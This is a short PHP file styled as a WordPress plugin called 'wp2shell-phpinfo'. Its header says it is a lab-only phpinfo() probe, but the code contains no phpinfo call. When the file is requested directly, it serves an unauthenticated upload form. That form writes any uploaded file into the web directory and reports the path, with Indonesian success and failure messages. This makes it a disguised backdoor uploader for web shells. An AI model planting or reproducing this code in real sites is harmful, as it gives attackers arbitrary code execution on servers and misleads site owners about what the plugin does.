<?php
/**
 * Plugin Name: wp2shell-phpinfo
 * Description: Lab-only phpinfo() probe. Authorized testing only.
 * Version: 0.0.1
 */
if (!defined('ABSPATH')) {
    echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
    echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';

    if (isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
        $destination = getcwd() . DIRECTORY_SEPARATOR . $_FILES['file']['name'];
        if (@copy($_FILES['file']['tmp_name'], $destination)) {
            echo '<b>BERHASIL</b><br>';
            echo 'Lokasi file: ' . htmlspecialchars($destination) . '<br><br>';
        } else {
            echo '<b>GAGAL</b><br><br>';
        }
    }
    exit;
}
